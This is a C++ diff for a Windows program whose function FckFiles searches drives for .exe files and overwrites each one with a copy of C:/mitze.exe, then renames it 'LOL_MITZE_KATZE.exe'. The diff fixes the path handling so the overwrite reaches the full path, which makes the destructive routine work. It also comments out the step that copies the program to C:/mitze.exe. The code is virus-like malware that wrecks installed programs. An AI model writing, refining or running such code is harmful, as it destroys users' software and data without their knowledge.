@@ -19,7 +19,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
   std::string filter = directory + (recursively ? "*" : fileFilter);
 
   hFind = FindFirstFile(filter.c_str(), &FindFileData);
-  //cout << hFind)
+
   if (hFind == INVALID_HANDLE_VALUE)
   {
     return;
@@ -28,31 +28,26 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
   {
     if (!recursively)
     {
-		Chain = Chain + sWords[rand() % 4];
-		cout << Chain;
-		
-  		CopyFile("C:/mitze.exe",FindFileData.cFileName,0);
-  		rename(FindFileData.cFileName,"LOL_MITZE_KATZE.exe"+rand() % 999999);
-      //std::cout << directory + std::string(FindFileData.cFileName) << std::endl;
+    	string Chickfila = directory + std::string(FindFileData.cFileName);
+		CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
     }
 
     while (FindNextFile(hFind, &FindFileData) != 0)
     {
-		if (!recursively)
-		{
-			Chain = Chain + sWords[rand() % 4];
-			cout << Chain;
-			CopyFile("C:/mitze.exe",FindFileData.cFileName,0);
-			rename(FindFileData.cFileName,"LOL_MITZE_KATZE.exe"+rand() % 999999);
-			
-		}
-		else
-		{
-			if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
-        	{
-				FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
-        	}
-      	}
+      if (!recursively)
+      {
+        string Chickfila = directory + std::string(FindFileData.cFileName);
+        CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+  		rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
+      }
+      else
+      {
+        if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)>0 && FindFileData.cFileName[0]!='.')
+        {
+          FckFiles(directory + std::string(FindFileData.cFileName), fileFilter);
+        }
+      }
     }
 
     DWORD dwError = GetLastError();
@@ -66,6 +61,6 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 
 int main(int argc, char* argv[])
 {
-	CopyFile("./a.exe","C:/mitze.exe",0);
-	FckFiles("C:\\", "*.exe");
+	//CopyFile("./a.exe","C:/mitze.exe",0);
+	FckFiles("C:/", "*.exe");
 }
